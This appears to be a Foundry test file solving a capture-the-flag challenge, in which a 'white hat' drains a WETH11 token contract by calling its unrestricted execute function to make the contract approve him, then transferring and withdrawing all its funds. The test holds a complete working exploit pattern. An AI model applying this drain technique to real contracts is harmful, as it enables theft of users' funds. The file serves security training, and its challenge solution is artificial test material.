// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {WETH11} from "../src/WETH11.sol";

/*
The contract currently has 10^18 WETH11 tokens. (Check the Foundry configuration.)
You are Bob (the White Hat). 
Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.
*/

/*
1. Use execute function to approve bob to transfer ERC20 from WETH11 contract.
    0 value should be used to ensure that execute will not revert.
2. Transfer WETH11 tokens from contrac to bob.
3. exchange WET11 to ETH
*/

contract Weth11Test is Test {
    WETH11 public weth;
    // WETH11Attack public attackContract;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(weth.balanceOf(address(weth)), 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);
        weth.execute(address(weth), 0, abi.encodeWithSignature("approve(address,uint256)", address(bob), 999 ether));
        weth.transferFrom(address(weth), bob, 10 ether);
        weth.withdrawAll();
        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(weth.balanceOf(address(weth)), 0, "empty weth on weth contract");
        assertEq(bob.balance, 10 ether, "player should recover initial 10 ethers");
    }
}